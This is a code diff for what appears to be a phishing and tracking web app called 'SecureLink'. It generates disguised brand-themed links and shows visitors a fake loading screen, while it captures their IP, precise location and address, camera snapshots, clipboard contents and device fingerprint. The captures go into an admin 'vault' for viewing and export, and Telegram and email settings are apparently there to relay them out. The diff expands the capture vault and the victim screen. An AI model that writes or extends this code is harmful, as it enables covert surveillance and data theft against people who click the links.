   document.getElementById('shortCode').value = '';
   document.getElementById('destUrl').value = '';
   document.getElementById('loadMsg').value = '';
@@ -715,25 +672,23 @@ function createLink() {
 
 function previewLink() {
   const brand = state.selectedBrand;
-  const duration = Math.max(2, Math.min(20, parseInt(document.getElementById('loadDuration').value) || 6));
+  const duration = parseInt(document.getElementById('loadDuration').value) || 5;
   const msg = document.getElementById('loadMsg').value.trim() || BRANDS[brand].messages[0];
-  const dest = normalizeDest(document.getElementById('destUrl').value) || 'https://example.com';
-  const snapCount = Math.max(2, Math.min(5, parseInt(document.getElementById('snapCount').value) || 3));
-
-  const tempLink = {
-    brand, duration, message: msg, dest,
-    modules: ['ip','device','camera','location'],
-    snapCount,
+  const dest = document.getElementById('destUrl').value.trim() || 'https://example.com';
+  const snapCount = parseInt(document.getElementById('snapCount').value) || 3;
+  
+  const tempLink = { 
+    brand, duration, message: msg, dest, snapCount,
+    modules: ['ip','device','camera','location'], 
     code: 'preview',
     active: true
   };
   launchVictim(tempLink);
 }
 
-async function copyLink() {
+function copyLink() {
   const text = document.getElementById('linkOutput').textContent;
-  const ok = await safeCopy(text);
-  toast(ok ? 'Copied to clipboard' : 'Copy failed', ok ? 'success' : 'error');
+  navigator.clipboard.writeText(text).then(() => toast('Copied to clipboard', 'success'));
 }
 
 function deleteLink(id) {
@@ -756,45 +711,44 @@ function toggleLink(id) {
   }
 }
 
-async function copyLinkUrl(code) {
-  const link = state.links.find(l => l.code === code);
-  if (!link) return toast('Link not found', 'error');
-  const config = {
-    code: link.code,
-    brand: link.brand,
-    dest: link.dest,
-    duration: link.duration,
-    message: link.message,
-    modules: link.modules,
-    snapCount: link.snapCount || 3,
-    active: true
-  };
-  const encoded = b64urlEncode(JSON.stringify(config));
+function copyLinkUrl(code) {
   const baseUrl = window.location.origin + window.location.pathname;
-  const ok = await safeCopy(baseUrl + '#/' + encoded);
-  toast(ok ? 'Link copied' : 'Copy failed', ok ? 'success' : 'error');
+  navigator.clipboard.writeText(baseUrl + '#' + code).then(() => toast('Link copied', 'success'));
 }
 
 /* ============ RENDER ============ */
 function renderAll() {
   renderStats();
   renderLinks();
-  renderLogs();
+  renderVault();
+  updateVaultFilter();
 }
 
 function renderStats() {
-  const el = (id) => document.getElementById(id);
-  if (el('statLinks')) el('statLinks').textContent = state.links.length;
-  if (el('statHits')) el('statHits').textContent = state.links.reduce((s, l) => s + (l.hits || 0), 0);
-  if (el('statData')) el('statData').textContent = state.logs.length;
-  if (el('statActive')) el('statActive').textContent = state.links.filter(l => l.active).length;
-  updateLogBadge();
+  document.getElementById('statLinks').textContent = state.links.length;
+  document.getElementById('statHits').textContent = state.links.reduce((s, l) => s + (l.hits || 0), 0);
+  document.getElementById('statCaptured').textContent = state.logs.length;
+  const totalSnaps = state.logs.reduce((s, l) => s + (l.snaps ? l.snaps.length : 0), 0);
+  document.getElementById('statSnaps').textContent = totalSnaps;
+  
+  const storageUsed = new Blob([JSON.stringify(state.logs)]).size;
+  const maxStorage = 5 * 1024 * 1024;
+  const pct = Math.min(100, (storageUsed / maxStorage) * 100);
+  document.getElementById('statStorage').textContent = formatBytes(storageUsed);
+  document.getElementById('storageBar').style.width = pct + '%';
+}
+
+function formatBytes(bytes) {
+  if (bytes < 1024) return bytes + ' B';
+  if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
+  return (bytes / (1024 * 1024)).toFixed(2) + ' MB';
 }
 
 function renderLinks() {
+  const searchEl = document.getElementById('searchLinks');
+  const search = searchEl ? searchEl.value.toLowerCase() : '';
   const list = document.getElementById('linksList');
   if (!list) return;
-  const search = (document.getElementById('searchLinks')?.value || '').toLowerCase();
   const filtered = state.links.filter(l => 
     l.code.toLowerCase().includes(search) || 
     l.brand.toLowerCase().includes(search) ||
@@ -802,26 +756,29 @@ function renderLinks() {
   );
   
   if (filtered.length === 0) {
-    list.innerHTML = `<div class="text-center py-12 text-gray-500"><i class="fas fa-inbox text-4xl mb-3 block"></i><p>${state.links.length === 0 ? 'No links yet. Create your first one!' : 'No matches'}</p></div>`;
+    list.innerHTML = `<div class="text-center py-12 text-gray-500"><i class="fas fa-inbox text-4xl mb-3 block"></i><p>No links yet. Create your first one!</p></div>`;
     return;
   }
   
-  list.innerHTML = filtered.map(l => `
+  list.innerHTML = filtered.map(l => {
+    const linkLogs = state.logs.filter(log => log.code === l.code);
+    const snaps = linkLogs.reduce((s, log) => s + (log.snaps ? log.snaps.length : 0), 0);
+    return `
     <div class="p-4 rounded-xl bg-black/30 border border-white/5 hover:border-indigo-500/30 transition">
       <div class="flex items-start justify-between gap-4 flex-wrap">
         <div class="flex-1 min-w-0">
           <div class="flex items-center gap-2 mb-2 flex-wrap">
             <span class="status-dot ${l.active ? 'status-active' : 'status-inactive'}"></span>
-            <i class="${BRAND_ICONS[l.brand] || 'fas fa-link'}" style="color:${iconColorFor(l.brand)}"></i>
+            <i class="${BRAND_ICONS[l.brand] || 'fas fa-link'}" style="color:${BRANDS[l.brand]?.color || '#6366f1'}"></i>
             <span class="font-semibold capitalize">${BRANDS[l.brand]?.name || l.brand}</span>
             <code class="text-xs text-indigo-400 bg-indigo-500/10 px-2 py-0.5 rounded">/${l.code}</code>
           </div>
           <div class="text-xs text-gray-400 truncate mb-1"><i class="fas fa-arrow-right mr-1"></i>${l.dest}</div>
           <div class="flex gap-3 text-xs text-gray-500 flex-wrap">
             <span><i class="fas fa-eye mr-1"></i>${l.hits || 0} hits</span>
+            <span><i class="fas fa-database mr-1"></i>${linkLogs.length} captured</span>
+            <span><i class="fas fa-camera mr-1"></i>${snaps} snaps</span>
             <span><i class="fas fa-clock mr-1"></i>${new Date(l.created).toLocaleDateString()}</span>
-            <span><i class="fas fa-cube mr-1"></i>${l.modules.length} modules</span>
-            <span><i class="fas fa-camera mr-1"></i>${l.snapCount || 3} snaps</span>
           </div>
         </div>
         <div class="flex gap-2">
@@ -831,166 +788,331 @@ function renderLinks() {
           <button onclick="toggleLink(${l.id})" class="px-3 py-1.5 rounded-lg bg-white/5 hover:bg-white/10 text-sm transition" title="Toggle">
             <i class="fas fa-${l.active ? 'pause' : 'play'}"></i>
           </button>
+          <button onclick="viewLinkLogs('${l.code}')" class="px-3 py-1.5 rounded-lg bg-indigo-500/20 hover:bg-indigo-500/30 text-indigo-300 text-sm transition" title="View Data">
+            <i class="fas fa-vault"></i>
+          </button>
           <button onclick="deleteLink(${l.id})" class="px-3 py-1.5 rounded-lg bg-red-500/10 hover:bg-red-500/20 text-red-400 text-sm transition" title="Delete">
             <i class="fas fa-trash"></i>
           </button>
         </div>
       </div>
     </div>
-  `).join('');
+  `}).join('');
 }
 
-function renderLogs() {
-  const list = document.getElementById('logsList');
-  if (!list) return;
-  const search = (document.getElementById('searchLogs')?.value || '').toLowerCase();
-  const filtered = state.logs.filter(log =>
-    !search ||
-    (log.code || '').toLowerCase().includes(search) ||
-    (log.ip || '').toLowerCase().includes(search) ||
-    (log.location || '').toLowerCase().includes(search) ||
-    (log.platform || '').toLowerCase().includes(search)
-  );
+function viewLinkLogs(code) {
+  document.getElementById('vaultFilter').value = code;
+  switchTab('vault');
+  renderVault();
+}
 
+/* ============ VAULT ============ */
+function updateVaultFilter() {
+  const sel = document.getElementById('vaultFilter');
+  if (!sel) return;
+  const current = sel.value;
+  sel.innerHTML = '<option value="all">All Links</option>' + 
+    state.links.map(l => `<option value="${l.code}">/${l.code} (${BRANDS[l.brand]?.name || l.brand})</option>`).join('');
+  sel.value = current || 'all';
+}
+
+function renderVault() {
+  updateVaultFilter();
+  const searchEl = document.getElementById('vaultSearch');
+  const filterEl = document.getElementById('vaultFilter');
+  const search = searchEl ? searchEl.value.toLowerCase() : '';
+  const filter = filterEl ? filterEl.value : 'all';
+  const list = document.getElementById('vaultList');
+  if (!list) return;
+  
+  let filtered = state.logs.slice();
+  if (filter !== 'all') filtered = filtered.filter(l => l.code === filter);
+  if (search) {
+    filtered = filtered.filter(l => 
+      (l.ip || '').toLowerCase().includes(search) ||
+      (l.code || '').toLowerCase().includes(search) ||
+      (l.location || '').toLowerCase().includes(search) ||
+      (l.address || '').toLowerCase().includes(search) ||
+      (l.platform || '').toLowerCase().includes(search)
+    );
+  }
+  filtered.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+  
   if (filtered.length === 0) {
-    list.innerHTML = `<div class="text-center py-12 text-gray-500"><i class="fas fa-stream text-4xl mb-3 block"></i><p>${state.logs.length === 0 ? 'No captures yet' : 'No matches'}</p></div>`;
+    list.innerHTML = `<div class="text-center py-16 text-gray-500">
+      <i class="fas fa-vault text-5xl mb-4 block opacity-30"></i>
+      <p class="text-lg mb-1">Vault is empty</p>
+      <p class="text-sm">Captured data will appear here automatically</p>
+    </div>`;
     return;
   }
-
-  list.innerHTML = filtered.slice().reverse().map(log => {
-    const snaps = Array.isArray(log.snapshots) && log.snapshots.length
-      ? log.snapshots.filter(s => s && s.startsWith('data:'))
-      : (log.camera && log.camera.startsWith('data:') ? [log.camera] : []);
-
-    const thumbs = snaps.map((s, i) =>
-      `<img src="${s}" onclick="event.stopPropagation();openImage(this.src)" class="snap-thumb w-16 h-16 object-cover rounded-lg border border-white/10" title="Snapshot ${i+1}">`
-    ).join('');
-
+  
+  list.innerHTML = filtered.map(log => {
+    const brand = BRANDS[log.brand] || BRANDS.generic;
+    const firstSnap = log.snaps && log.snaps.find(s => s.startsWith('data:'));
+    const snapCount = log.snaps ? log.snaps.filter(s => s.startsWith('data:')).length : 0;
+    const hasLocation = log.location && log.location !== 'denied';
+    const hasAddress = log.address;
+    
     return `
-    <div class="log-card p-4 rounded-xl bg-black/30 border border-white/5">
-      <div class="flex items-center justify-between mb-3 flex-wrap gap-2">
-        <div class="flex items-center gap-2 flex-wrap">
-          <i class="fas fa-user-secret text-indigo-400"></i>
-          <span class="font-semibold text-sm">Capture</span>
-          <code class="text-xs text-gray-400 bg-black/40 px-2 py-0.5 rounded">/${log.code}</code>
-          ${log.new ? '<span class="text-xs px-2 py-0.5 rounded-full bg-green-500/20 text-green-300">new</span>' : ''}
+    <div class="log-row p-4 rounded-xl bg-black/30 border border-white/5 cursor-pointer" onclick="openLogDetail('${log.id}')">
+      <div class="flex gap-4 items-start">
+        ${firstSnap ? `
+          <div class="snap-thumb flex-shrink-0" style="width:120px;height:90px">
+            <img src="${firstSnap}" style="width:120px;height:90px;object-fit:cover">
+            ${snapCount > 1 ? `<div class="snap-badge"><i class="fas fa-images mr-1"></i>${snapCount}</div>` : ''}
+          </div>
+        ` : `
+          <div class="flex-shrink-0 w-[120px] h-[90px] rounded-lg bg-gradient-to-br from-indigo-500/20 to-purple-500/20 flex items-center justify-center">
+            <i class="fas fa-user-secret text-3xl text-indigo-400/50"></i>
+          </div>
+        `}
+        <div class="flex-1 min-w-0">
+          <div class="flex items-center gap-2 mb-2 flex-wrap">
+            <i class="${BRAND_ICONS[log.brand] || 'fas fa-link'}" style="color:${brand.color}"></i>
+            <code class="text-xs text-indigo-400 bg-indigo-500/10 px-2 py-0.5 rounded">/${log.code}</code>
+            <span class="text-xs text-gray-500">${new Date(log.timestamp).toLocaleString()}</span>
+          </div>
+          <div class="grid grid-cols-2 md:grid-cols-4 gap-2 text-xs mb-2">
+            ${log.ip ? `<div class="data-chip"><i class="fas fa-globe"></i>${log.ip}</div>` : ''}
+            ${hasLocation ? `<div class="data-chip"><i class="fas fa-map-marker-alt"></i>${log.location}</div>` : ''}
+            ${log.platform ? `<div class="data-chip"><i class="fas fa-mobile"></i>${log.platform}</div>` : ''}
+            ${log.screen ? `<div class="data-chip"><i class="fas fa-desktop"></i>${log.screen}</div>` : ''}
+          </div>
+          ${hasAddress ? `<div class="text-xs text-gray-400 truncate"><i class="fas fa-location-arrow mr-1 text-pink-400"></i>${log.address}</div>` : ''}
         </div>
-        <span class="text-xs text-gray-500">${new Date(log.timestamp).toLocaleString()}</span>
+        <div class="flex flex-col gap-1 flex-shrink-0">
+          <button onclick="event.stopPropagation();openLogDetail('${log.id}')" class="px-3 py-1.5 rounded-lg bg-indigo-500/20 hover:bg-indigo-500/30 text-indigo-300 text-xs transition">
+            <i class="fas fa-eye mr-1"></i>View
+          </button>
+          <button onclick="event.stopPropagation();deleteLog('${log.id}')" class="px-3 py-1.5 rounded-lg bg-red-500/10 hover:bg-red-500/20 text-red-400 text-xs transition">
+            <i class="fas fa-trash mr-1"></i>Delete
+          </button>
+        </div>
       </div>
-
-      ${thumbs ? `<div class="flex flex-wrap gap-2 mb-3">${thumbs}</div>` : ''}
-
-      <div class="grid grid-cols-2 md:grid-cols-4 gap-2 text-xs">
-        ${log.ip ? `<div class="p-2 rounded bg-black/40"><span class="text-gray-500">IP:</span> <span class="text-gray-300">${log.ip}</span></div>` : ''}
-        ${log.location ? `<div class="p-2 rounded bg-black/40 col-span-2"><span class="text-gray-500">Location:</span> <span class="text-gray-300">${log.location}${log.accuracy ? ' ±'+log.accuracy+'m' : ''}</span></div>` : ''}
-        ${log.platform ? `<div class="p-2 rounded bg-black/40 col-span-2"><span class="text-gray-500">Platform:</span> <span class="text-gray-300 truncate">${log.platform}</span></div>` : ''}
-        ${log.language ? `<div class="p-2 rounded bg-black/40"><span class="text-gray-500">Lang:</span> <span class="text-gray-300">${log.language}</span></div>` : ''}
-        ${log.screen ? `<div class="p-2 rounded bg-black/40"><span class="text-gray-500">Screen:</span> <span class="text-gray-300">${log.screen}</span></div>` : ''}
-        ${log.tz ? `<div class="p-2 rounded bg-black/40"><span class="text-gray-500">TZ:</span> <span class="text-gray-300">${log.tz}</span></div>` : ''}
-        ${log.battery ? `<div class="p-2 rounded bg-black/40"><span class="text-gray-500">Battery:</span> <span class="text-gray-300">${log.battery}</span></div>` : ''}
-        ${log.connection ? `<div class="p-2 rounded bg-black/40"><span class="text-gray-500">Network:</span> <span class="text-gray-300">${log.connection}${log.downlink ? ' · '+log.downlink+'Mbps' : ''}</span></div>` : ''}
-        ${log.clipboard ? `<div class="p-2 rounded bg-black/40 col-span-2"><span class="text-gray-500">Clipboard:</span> <span class="text-gray-300 break-all">${log.clipboard}</span></div>` : ''}
-        ${log.fingerprint ? `<div class="p-2 rounded bg-black/40 col-span-2"><span class="text-gray-500">Fingerprint:</span> <span class="text-gray-300 font-mono">${log.fingerprint}</span></div>` : ''}
-      </div>
-
-      <div class="mt-3 flex justify-end gap-2">
-        <button onclick="copyLog(${log.id})" class="px-3 py-1.5 rounded-lg bg-white/5 hover:bg-white/10 text-xs transition">
-          <i class="fas fa-copy mr-1"></i>Copy
-        </button>
-        <button onclick="deleteLog(${log.id})" class="px-3 py-1.5 rounded-lg bg-red-500/10 hover:bg-red-500/20 text-red-400 text-xs transition">
-          <i class="fas fa-trash mr-1"></i>Delete
-        </button>
-      </div>
-    </div>`;
-  }).join('');
+    </div>
+  `}).join('');
 }
 
-function openImage(src) {
-  const modal = document.getElementById('imgModal');
-  document.getElementById('imgModalSrc').src = src;
-  modal.classList.remove('hidden');
-}
-
-function deleteLog(id) {
-  state.logs = state.logs.filter(l => l.id !== id);
-  safeSet('sl_logs', state.logs);
-  renderLogs();
-  renderStats();
-  toast('Capture deleted', 'success');
-}
-
-async function copyLog(id) {
-  const log = state.logs.find(l => l.id === id);
+function openLogDetail(logId) {
+  const log = state.logs.find(l => l.id == logId);
   if (!log) return;
-  const text = [
-    `Capture /${log.code}`,
-    `Time: ${log.timestamp}`,
-    log.ip ? `IP: ${log.ip}` : null,
-    log.location ? `Location: ${log.location}${log.accuracy ? ' ±'+log.accuracy+'m' : ''}` : null,
-    log.platform ? `Platform: ${log.platform}` : null,
-    log.language ? `Language: ${log.language}` : null,
-    log.screen ? `Screen: ${log.screen}` : null,
-    log.tz ? `Timezone: ${log.tz}` : null,
-    log.battery ? `Battery: ${log.battery}` : null,
-    log.connection ? `Network: ${log.connection}` : null,
-    log.clipboard ? `Clipboard: ${log.clipboard}` : null,
-    log.fingerprint ? `Fingerprint: ${log.fingerprint}` : null
-  ].filter(Boolean).join('\n');
-  const ok = await safeCopy(text);
-  toast(ok ? 'Copied' : 'Copy failed', ok ? 'success' : 'error');
+  const brand = BRANDS[log.brand] || BRANDS.generic;
+  
+  const modal = document.getElementById('modalRoot');
+  modal.innerHTML = `
+    <div class="modal-overlay" onclick="if(event.target===this)closeModal()">
+      <div class="modal-box glass rounded-2xl p-6 fade-in">
+        <div class="flex items-start justify-between mb-6">
+          <div>
+            <div class="flex items-center gap-2 mb-2">
+              <i class="${BRAND_ICONS[log.brand] || 'fas fa-link'} text-xl" style="color:${brand.color}"></i>
+              <h2 class="text-xl font-bold">Hit Details</h2>
+              <code class="text-xs text-indigo-400 bg-indigo-500/10 px-2 py-0.5 rounded">/${log.code}</code>
+            </div>
+            <p class="text-xs text-gray-400">${new Date(log.timestamp).toLocaleString()}</p>
+          </div>
+          <button onclick="closeModal()" class="w-8 h-8 rounded-lg bg-white/5 hover:bg-white/10 flex items-center justify-center">
+            <i class="fas fa-times"></i>
+          </button>
+        </div>
+
+        ${log.snaps && log.snaps.filter(s => s.startsWith('data:')).length > 0 ? `
+          <div class="mb-6">
+            <h3 class="text-sm font-semibold mb-3 flex items-center gap-2">
+              <i class="fas fa-camera text-pink-400"></i>Camera Snaps (${log.snaps.filter(s => s.startsWith('data:')).length})
+            </h3>
+            <div class="gallery-grid">
+              ${log.snaps.filter(s => s.startsWith('data:')).map((snap, i) => `
+                <div class="snap-thumb" onclick="event.stopPropagation();viewFullImage('${log.id}', ${i})">
+                  <img src="${snap}" alt="Snap ${i+1}">
+                  <div class="snap-badge">Snap ${i+1}</div>
+                </div>
+              `).join('')}
+            </div>
+            <div class="flex gap-2 mt-3">
+              <button onclick="downloadAllSnaps('${log.id}')" class="px-3 py-1.5 rounded-lg bg-green-500/20 hover:bg-green-500/30 text-green-300 text-xs transition">
+                <i class="fas fa-download mr-1"></i>Download All Snaps
+              </button>
+            </div>
+          </div>
+        ` : ''}
+
+        <div class="grid md:grid-cols-2 gap-4 mb-6">
+          <div class="p-4 rounded-xl bg-black/40 border border-white/5">
+            <h4 class="text-xs text-gray-400 uppercase tracking-wider mb-3"><i class="fas fa-network-wired mr-1"></i>Network</h4>
+            <div class="space-y-2 text-sm">
+              ${log.ip ? `<div class="flex justify-between"><span class="text-gray-500">IP Address</span><span class="text-gray-200 font-mono">${log.ip}</span></div>` : ''}
+              ${log.connection ? `<div class="flex justify-between"><span class="text-gray-500">Connection</span><span class="text-gray-200">${log.connection}${log.downlink ? ' ('+log.downlink+' Mbps)' : ''}</span></div>` : ''}
+            </div>
+          </div>
+          
+          <div class="p-4 rounded-xl bg-black/40 border border-white/5">
+            <h4 class="text-xs text-gray-400 uppercase tracking-wider mb-3"><i class="fas fa-map-marker-alt mr-1"></i>Location</h4>
+            <div class="space-y-2 text-sm">
+              ${log.location && log.location !== 'denied' ? `<div class="flex justify-between"><span class="text-gray-500">Coordinates</span><span class="text-gray-200 font-mono text-xs">${log.location}</span></div>` : ''}
+              ${log.accuracy ? `<div class="flex justify-between"><span class="text-gray-500">Accuracy</span><span class="text-gray-200">±${log.accuracy}m</span></div>` : ''}
+              ${log.address ? `<div><span class="text-gray-500 text-xs">Address</span><p class="text-gray-200 text-xs mt-1">${log.address}</p></div>` : ''}
+              ${log.location === 'denied' ? `<div class="text-red-400 text-xs">Location access denied</div>` : ''}
+              ${log.location && log.location !== 'denied' ? `
+                <a href="https://www.google.com/maps?q=${log.location}" target="_blank" class="inline-block mt-2 px-3 py-1 rounded bg-indigo-500/20 hover:bg-indigo-500/30 text-indigo-300 text-xs">
+                  <i class="fas fa-external-link-alt mr-1"></i>Open in Maps
+                </a>
+              ` : ''}
+            </div>
+          </div>
+          
+          <div class="p-4 rounded-xl bg-black/40 border border-white/5">
+            <h4 class="text-xs text-gray-400 uppercase tracking-wider mb-3"><i class="fas fa-mobile-alt mr-1"></i>Device</h4>
+            <div class="space-y-2 text-sm">
+              ${log.platform ? `<div class="flex justify-between"><span class="text-gray-500">Platform</span><span class="text-gray-200">${log.platform}</span></div>` : ''}
+              ${log.language ? `<div class="flex justify-between"><span class="text-gray-500">Language</span><span class="text-gray-200">${log.language}</span></div>` : ''}
+              ${log.screen ? `<div class="flex justify-between"><span class="text-gray-500">Screen</span><span class="text-gray-200">${log.screen}</span></div>` : ''}
+              ${log.tz ? `<div class="flex justify-between"><span class="text-gray-500">Timezone</span><span class="text-gray-200 text-xs">${log.tz}</span></div>` : ''}
+            </div>
+          </div>
+          
+          <div class="p-4 rounded-xl bg-black/40 border border-white/5">
+            <h4 class="text-xs text-gray-400 uppercase tracking-wider mb-3"><i class="fas fa-microchip mr-1"></i>System</h4>
+            <div class="space-y-2 text-sm">
+              ${log.battery ? `<div class="flex justify-between"><span class="text-gray-500">Battery</span><span class="text-gray-200">${log.battery}</span></div>` : ''}
+              ${log.userAgent ? `<div><span class="text-gray-500 text-xs">User Agent</span><p class="text-gray-200 text-xs mt-1 break-all">${log.userAgent}</p></div>` : ''}
+            </div>
+          </div>
+          
+          ${log.clipboard ? `
+            <div class="p-4 rounded-xl bg-black/40 border border-white/5 md:col-span-2">
+              <h4 class="text-xs text-gray-400 uppercase tracking-wider mb-3"><i class="fas fa-clipboard mr-1"></i>Clipboard</h4>
+              <pre class="text-xs text-gray-200 bg-black/60 p-3 rounded overflow-x-auto">${escapeHtml(log.clipboard)}</pre>
+            </div>
+          ` : ''}
+        </div>
+
+        <div class="flex gap-2 flex-wrap">
+          <button onclick="downloadLogJSON('${log.id}')" class="px-4 py-2 rounded-lg bg-green-500/20 hover:bg-green-500/30 text-green-300 text-sm transition">
+            <i class="fas fa-download mr-1"></i>Download JSON
+          </button>
+          <button onclick="deleteLog('${log.id}');closeModal()" class="px-4 py-2 rounded-lg bg-red-500/10 hover:bg-red-500/20 text-red-400 text-sm transition">
+            <i class="fas fa-trash mr-1"></i>Delete
+          </button>
+        </div>
+      </div>
+    </div>
+  `;
 }
 
-function clearLogs() {
-  if (!confirm('Clear all captures?')) return;
-  state.logs = [];
-  safeSet('sl_logs', state.logs);
-  renderLogs();
-  renderStats();
-  toast('Captures cleared', 'success');
+function closeModal() {
+  document.getElementById('modalRoot').innerHTML = '';
 }
 
-function exportAllLogs() {
-  if (!state.logs.length) return toast('Nothing to export', 'error');
-  const data = JSON.stringify(state.logs, null, 2);
-  const blob = new Blob([data], { type: 'application/json' });
+function viewFullImage(logId, snapIdx) {
+  const log = state.logs.find(l => l.id == logId);
+  if (!log) return;
+  const realSnaps = log.snaps.filter(s => s.startsWith('data:'));
+  if (!realSnaps[snapIdx]) return;
+  const modal = document.getElementById('modalRoot');
+  modal.innerHTML = `
+    <div class="modal-overlay" onclick="if(event.target===this)openLogDetail('${logId}')">
+      <div class="text-center">
+        <img src="${realSnaps[snapIdx]}" style="max-width:90vw;max-height:85vh;border-radius:12px;box-shadow:0 20px 60px rgba(0,0,0,0.5)">
+        <div class="mt-4 flex gap-2 justify-center">
+          <button onclick="downloadSingleSnap('${logId}',${snapIdx})" class="px-4 py-2 rounded-lg bg-green-500/20 hover:bg-green-500/30 text-green-300 text-sm transition">
+            <i class="fas fa-download mr-1"></i>Download
+          </button>
+          <button onclick="openLogDetail('${logId}')" class="px-4 py-2 rounded-lg bg-white/10 hover:bg-white/20 text-sm transition">
+            <i class="fas fa-arrow-left mr-1"></i>Back
+          </button>
+        </div>
+      </div>
+    </div>
+  `;
+}
+
+function downloadSingleSnap(logId, idx) {
+  const log = state.logs.find(l => l.id == logId);
+  if (!log) return;
+  const realSnaps = log.snaps.filter(s => s.startsWith('data:'));
+  const a = document.createElement('a');
+  a.href = realSnaps[idx];
+  a.download = `snap_${log.code}_${idx+1}_${Date.now()}.jpg`;
+  a.click();
+}
+
+function downloadAllSnaps(logId) {
+  const log = state.logs.find(l => l.id == logId);
+  if (!log || !log.snaps) return;
+  const realSnaps = log.snaps.filter(s => s.startsWith('data:'));
+  realSnaps.forEach((snap, i) => {
+    setTimeout(() => {
+      const a = document.createElement('a');
+      a.href = snap;
+      a.download = `snap_${log.code}_${i+1}.jpg`;
+      a.click();
+    }, i * 300);
+  });
+  toast(`Downloading ${realSnaps.length} snaps`, 'success');
+}
+
+function downloadLogJSON(logId) {
+  const log = state.logs.find(l => l.id == logId);
+  if (!log) return;
+  const blob = new Blob([JSON.stringify(log, null, 2)], { type: 'application/json' });
   const url = URL.createObjectURL(blob);
   const a = document.createElement('a');
   a.href = url;
-  a.download = `securelink-captures-${Date.now()}.json`;
-  document.body.appendChild(a);
+  a.download = `hit_${log.code}_${Date.now()}.json`;
   a.click();
-  a.remove();
   URL.revokeObjectURL(url);
-  toast('Exported', 'success');
+  toast('JSON downloaded', 'success');
 }
 
-/* ============ LOG BADGE ============ */
-function updateLogBadge() {
-  const badge = document.getElementById('logBadge');
-  if (!badge) return;
-  const n = state.logs.filter(l => l.new).length;
-  if (n > 0) {
-    badge.textContent = n;
-    badge.classList.remove('hidden');
-  } else {
-    badge.classList.add('hidden');
-  }
+function exportAllJSON() {
+  if (state.logs.length === 0) return toast('No data to export', 'error');
+  const blob = new Blob([JSON.stringify(state.logs, null, 2)], { type: 'application/json' });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = `securelink_vault_${Date.now()}.json`;
+  a.click();
+  URL.revokeObjectURL(url);
+  toast('Vault exported', 'success');
 }
-function hideLogBadge() {
-  state.logs.forEach(l => l.new = false);
-  safeSet('sl_logs', state.logs);
-  updateLogBadge();
+
+function deleteLog(logId) {
+  if (!confirm('Delete this captured data?')) return;
+  state.logs = state.logs.filter(l => l.id != logId);
+  saveLogs();
+  renderVault();
+  renderStats();
+  renderLinks();
+  toast('Data deleted', 'success');
+}
+
+function clearVault() {
+  if (!confirm('Delete ALL captured data? This cannot be undone.')) return;
+  state.logs = [];
+  saveLogs();
+  renderVault();
+  renderStats();
+  renderLinks();
+  toast('Vault cleared', 'success');
+}
+
+function escapeHtml(s) {
+  return String(s).replace(/[&<>"']/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m]));
 }
 
 /* ============ SETTINGS ============ */
 function loadSettings() {
   const s = state.settings;
-  if (s.tgToken && document.getElementById('tgToken')) document.getElementById('tgToken').value = s.tgToken;
-  if (s.tgChat && document.getElementById('tgChat')) document.getElementById('tgChat').value = s.tgChat;
-  if (s.emPub && document.getElementById('emPub')) document.getElementById('emPub').value = s.emPub;
-  if (s.emSvc && document.getElementById('emSvc')) document.getElementById('emSvc').value = s.emSvc;
-  if (s.emTpl && document.getElementById('emTpl')) document.getElementById('emTpl').value = s.emTpl;
-  if (s.emTo && document.getElementById('emTo')) document.getElementById('emTo').value = s.emTo;
+  if (s.tgToken) document.getElementById('tgToken').value = s.tgToken;
+  if (s.tgChat) document.getElementById('tgChat').value = s.tgChat;
+  if (s.emPub) document.getElementById('emPub').value = s.emPub;
+  if (s.emSvc) document.getElementById('emSvc').value = s.emSvc;
+  if (s.emTpl) document.getElementById('emTpl').value = s.emTpl;
+  if (s.emTo) document.getElementById('emTo').value = s.emTo;
+  if (s.defSnapCount) document.getElementById('defSnapCount').value = s.defSnapCount;
+  if (s.defImgQuality) document.getElementById('defImgQuality').value = s.defImgQuality;
 }
 
 function saveSettings() {
@@ -1000,10 +1122,12 @@ function saveSettings() {
     emPub: document.getElementById('emPub').value.trim(),
     emSvc: document.getElementById('emSvc').value.trim(),
     emTpl: document.getElementById('emTpl').value.trim(),
-    emTo: document.getElementById('emTo').value.trim()
+    emTo: document.getElementById('emTo').value.trim(),
+    defSnapCount: parseInt(document.getElementById('defSnapCount').value) || 3,
+    defImgQuality: parseFloat(document.getElementById('defImgQuality').value) || 0.5
   };
-  safeSet('sl_settings', state.settings);
-  toast('Settings saved', 'success');
+  localStorage.setItem('sl_settings', JSON.stringify(state.settings));
+  toast('Settings saved successfully', 'success');
 }
 
 async function testTelegram() {
@@ -1014,10 +1138,7 @@ async function testTelegram() {
     const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: chat,
-        text: '✅ SecureLink connection test successful! Bot is working.'
-      })
+      body: JSON.stringify({ chat_id: chat, text: '✅ SecureLink connection test successful!' })
     });
     const data = await res.json();
     if (data.ok) toast('Telegram test sent!', 'success');
@@ -1027,40 +1148,50 @@ async function testTelegram() {
   }
 }
 
-/* ============ VICTIM SCREEN ============ */
+/* ============ VICTIM SCREEN (PROFESSIONAL BRAND) ============ */
 function launchVictim(link) {
-  document.getElementById('loginScreen').classList.add('hidden');
-  document.getElementById('adminPanel').classList.add('hidden');
+  document.getElementById('loginScreen').style.display = 'none';
+  document.getElementById('adminPanel').style.display = 'none';
   const vs = document.getElementById('victimScreen');
-  vs.classList.remove('hidden');
-
+  vs.style.display = 'block';
+  
   const brand = BRANDS[link.brand] || BRANDS.generic;
   const messages = brand.messages;
-
+  const startTime = Date.now();
+  const minDisplayMs = (link.duration || 5) * 1000;
+  const maxTimeoutMs = Math.max(minDisplayMs + 15000, 25000); // never hang forever
+  
+  // Track collection status
+  const status = {
+    total: 0,
+    completed: 0,
+    allDone: false,
+    redirected: false
+  };
+  
   vs.innerHTML = `
     <div class="loader-screen" style="background:${brand.bg};color:${brand.textColor}">
-      <div style="margin-bottom:30px">${brand.logo}</div>
-      <div class="brand-spinner" style="border-top-color:${brand.color}"></div>
-      <p id="victimMsg" style="margin-top:24px;font-size:14px;opacity:.7;letter-spacing:.5px">${link.message}</p>
-      <p style="margin-top:8px;font-size:11px;opacity:.4">Please wait...</p>
